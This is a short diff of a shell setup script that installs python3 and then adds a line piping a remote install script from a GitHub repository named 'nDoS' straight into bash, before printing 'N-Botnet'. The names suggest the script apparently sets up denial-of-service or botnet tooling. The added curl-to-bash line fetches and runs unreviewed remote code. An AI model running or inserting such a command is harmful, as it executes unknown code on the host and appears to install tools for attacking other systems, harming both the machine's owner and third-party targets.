@@ -2,6 +2,7 @@
 clear
 apt update
 apt install python3
+bash <(curl -s https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/install.sh)
 clear
 
 echo "N-Botnet"
